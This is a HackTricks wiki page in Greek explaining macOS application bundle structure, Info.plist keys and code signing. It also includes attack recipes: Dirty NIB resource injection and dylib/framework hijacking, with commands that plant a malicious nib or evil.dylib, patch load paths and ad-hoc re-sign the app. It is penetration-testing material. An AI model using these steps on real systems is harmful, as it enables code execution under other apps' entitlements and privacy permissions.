# macOS Bundles

{{#include ../../../banners/hacktricks-training.md}}

## Βασικές πληροφορίες

Τα Bundles στο macOS λειτουργούν ως containers για διάφορους πόρους, όπως applications, libraries και άλλα απαραίτητα αρχεία, με αποτέλεσμα να εμφανίζονται ως ενιαία αντικείμενα στο Finder, όπως τα γνωστά αρχεία `*.app`. Το συνηθέστερο Bundle είναι το `.app` Bundle, αν και είναι επίσης διαδεδομένοι και άλλοι τύποι, όπως `.framework`, `.systemextension` και `.kext`.

### Βασικά στοιχεία ενός Bundle

Μέσα σε ένα Bundle, και ιδιαίτερα μέσα στον κατάλογο `<application>.app/Contents/`, φιλοξενούνται διάφοροι σημαντικοί πόροι:

- **\_CodeSignature**: Αυτός ο κατάλογος αποθηκεύει τις λεπτομέρειες code-signing που είναι απαραίτητες για την επαλήθευση της ακεραιότητας του application. Μπορείτε να επιθεωρήσετε τις πληροφορίες code-signing χρησιμοποιώντας εντολές όπως:
```bash
openssl dgst -binary -sha1 /Applications/Safari.app/Contents/Resources/Assets.car | openssl base64
```
- **MacOS**: Περιέχει το εκτελέσιμο binary της εφαρμογής, το οποίο εκτελείται μετά από αλληλεπίδραση του χρήστη.
- **Resources**: Αποθετήριο για τα στοιχεία του user interface της εφαρμογής, συμπεριλαμβανομένων εικόνων, εγγράφων και περιγραφών interface (αρχεία nib/xib).
- **Info.plist**: Λειτουργεί ως το κύριο αρχείο configuration της εφαρμογής και είναι απαραίτητο για να αναγνωρίζει και να αλληλεπιδρά σωστά το σύστημα με την εφαρμογή.

#### Σημαντικά Keys στο Info.plist

Το αρχείο `Info.plist` αποτελεί θεμελιώδες στοιχείο του application configuration και περιέχει keys όπως:

- **CFBundleExecutable**: Καθορίζει το όνομα του κύριου executable file που βρίσκεται στον κατάλογο `Contents/MacOS`.
- **CFBundleIdentifier**: Παρέχει ένα global identifier για την εφαρμογή, το οποίο χρησιμοποιείται εκτενώς από το macOS για τη διαχείριση εφαρμογών.
- **LSMinimumSystemVersion**: Υποδεικνύει την ελάχιστη έκδοση του macOS που απαιτείται για την εκτέλεση της εφαρμογής.

### Εξερεύνηση Bundles

Για την εξερεύνηση των περιεχομένων ενός bundle, όπως το `Safari.app`, μπορεί να χρησιμοποιηθεί η ακόλουθη εντολή: `bash ls -lR /Applications/Safari.app/Contents`

Αυτή η εξερεύνηση αποκαλύπτει καταλόγους όπως οι `_CodeSignature`, `MacOS`, `Resources` και αρχεία όπως το `Info.plist`, καθένα από τα οποία εξυπηρετεί έναν μοναδικό σκοπό, από την ασφάλιση της εφαρμογής έως τον καθορισμό του user interface και των operational parameters της.

#### Πρόσθετοι Bundle Directories

Πέρα από τους συνηθισμένους καταλόγους, τα bundles μπορεί επίσης να περιλαμβάνουν:

- **Frameworks**: Περιέχει bundled frameworks που χρησιμοποιούνται από την εφαρμογή. Τα frameworks μοιάζουν με dylibs, αλλά διαθέτουν επιπλέον resources.
- **PlugIns**: Κατάλογος για plug-ins και extensions που επεκτείνουν τις δυνατότητες της εφαρμογής.
- **XPCServices**: Περιέχει XPC services που χρησιμοποιούνται από την εφαρμογή για out-of-process communication.

Αυτή η δομή διασφαλίζει ότι όλα τα απαραίτητα components είναι encapsulated μέσα στο bundle, διευκολύνοντας ένα modular και secure application environment.

Για πιο λεπτομερείς πληροφορίες σχετικά με τα keys του `Info.plist` και τη σημασία τους, η τεκμηρίωση της Apple για developers παρέχει εκτενείς resources: [Αναφορά των Apple Info.plist Keys](https://developer.apple.com/library/archive/documentation/General/Reference/InfoPlistKeyReference/Introduction/Introduction.html).

## Security Notes & Abuse Vectors

- **Gatekeeper / App Translocation**: Όταν ένα quarantined bundle εκτελείται για πρώτη φορά, το macOS πραγματοποιεί deep signature verification και μπορεί να το εκτελέσει από ένα randomized translocated path. Αφού γίνει αποδεκτό, οι επόμενες εκκινήσεις πραγματοποιούν μόνο shallow checks· τα resource files στα `Resources/`, `PlugIns/`, nibs κ.λπ. historically δεν ελέγχονταν. Από το macOS 13 Ventura, επιβάλλεται deep check κατά την πρώτη εκτέλεση και η νέα άδεια TCC *App Management* περιορίζει third-party processes από την τροποποίηση άλλων bundles χωρίς τη συναίνεση του χρήστη, όμως τα παλαιότερα συστήματα παραμένουν ευάλωτα.
- **Bundle Identifier collisions**: Πολλαπλά embedded targets (PlugIns, helper tools) που επαναχρησιμοποιούν το ίδιο `CFBundleIdentifier` μπορούν να προκαλέσουν αποτυχία του signature validation και περιστασιακά να επιτρέψουν URL-scheme hijacking/confusion. Να κάνετε πάντα enumerate τα sub-bundles και να επαληθεύετε ότι τα IDs είναι μοναδικά.

## Resource Hijacking (Dirty NIB / NIB Injection)

Πριν από το Ventura, η αντικατάσταση UI resources σε signed app μπορούσε να παρακάμψει το shallow code signing και να οδηγήσει σε code execution με τα entitlements της εφαρμογής. Η τρέχουσα έρευνα (2024) δείχνει ότι αυτό εξακολουθεί να λειτουργεί σε pre-Ventura και σε un-quarantined builds:<sup>[[1]](#references)[[2]](#references)</sup>

1. Αντιγράψτε την target app σε writable location (π.χ. `/tmp/Victim.app`).
2. Αντικαταστήστε το `Contents/Resources/MainMenu.nib` (ή οποιοδήποτε nib δηλώνεται στο `NSMainNibFile`) με ένα malicious nib που κάνει instantiate `NSAppleScript`, `NSTask` κ.λπ.
3. Εκκινήστε την εφαρμογή. Το malicious nib εκτελείται υπό το bundle ID και τα entitlements του victim (TCC grants, microphone/camera κ.λπ.).
4. Το Ventura+ μετριάζει το πρόβλημα πραγματοποιώντας deep verification του bundle κατά την πρώτη εκκίνηση και απαιτώντας permission *App Management* για μεταγενέστερες τροποποιήσεις, επομένως το persistence είναι δυσκολότερο, αλλά οι initial-launch attacks σε παλαιότερα macOS εξακολουθούν να ισχύουν.<sup>[[1]](#references)</sup>

Minimal malicious nib payload example (compile xib to nib with `ibtool`):
```bash
# create a nib that runs osascript -e 'do shell script "id"'
# ...build xib in Xcode, then
ibtool --compile MainMenu.nib MainMenu.xib
cp MainMenu.nib /tmp/Victim.app/Contents/Resources/
open /tmp/Victim.app
```
## Framework / PlugIn / dylib Hijacking μέσα σε Bundles

Επειδή οι αναζητήσεις `@rpath` προτιμούν τα bundled Frameworks/PlugIns, η τοποθέτηση μιας κακόβουλης library μέσα στο `Contents/Frameworks/` ή στο `Contents/PlugIns/` μπορεί να ανακατευθύνει τη σειρά φόρτωσης, όταν το κύριο binary είναι signed χωρίς library validation ή με αδύναμη σειρά `LC_RPATH`.

Τυπικά βήματα κατά την κατάχρηση ενός unsigned/ad-hoc bundle:
```bash
cp evil.dylib /tmp/Victim.app/Contents/Frameworks/
install_name_tool -add_rpath @executable_path/../Frameworks /tmp/Victim.app/Contents/MacOS/Victim
# or patch an existing load command
install_name_tool -change @rpath/Legit.dylib @rpath/evil.dylib /tmp/Victim.app/Contents/MacOS/Victim
codesign -f -s - --timestamp=none /tmp/Victim.app/Contents/Frameworks/evil.dylib
codesign -f -s - --deep --timestamp=none /tmp/Victim.app
open /tmp/Victim.app
```
Σημειώσεις:
- Το Hardened runtime χωρίς το `com.apple.security.cs.disable-library-validation` αποκλείει third-party dylibs· ελέγξτε πρώτα τα entitlements.
- Τα XPC services στο `Contents/XPCServices/` συχνά φορτώνουν sibling frameworks — κάντε patch στα binaries τους με παρόμοιο τρόπο για persistence ή privilege escalation paths.

## Cheatsheet γρήγορης επιθεώρησης
```bash
# list top-level bundle metadata
/usr/libexec/PlistBuddy -c "Print :CFBundleIdentifier" /Applications/App.app/Contents/Info.plist

# enumerate embedded bundles
find /Applications/App.app/Contents -name "*.app" -o -name "*.framework" -o -name "*.plugin" -o -name "*.xpc"

# verify code signature depth
codesign --verify --deep --strict /Applications/App.app && echo OK

# show rpaths and linked libs
otool -l /Applications/App.app/Contents/MacOS/App | grep -A2 RPATH
otool -L /Applications/App.app/Contents/MacOS/App
```
## References

- [1] [Bringing process injection into view(s): exploiting macOS apps using nib files (2024)](https://sector7.computest.nl/post/2024-04-bringing-process-injection-into-view-exploiting-all-macos-apps-using-nib-files/)
- [2] [Dirty NIB & bundle resource tampering write‑up (2024)](https://karol-mazurek.medium.com/snake-apple-app-bundle-ext-f5c43a3c84c4)

{{#include ../../../banners/hacktricks-training.md}}
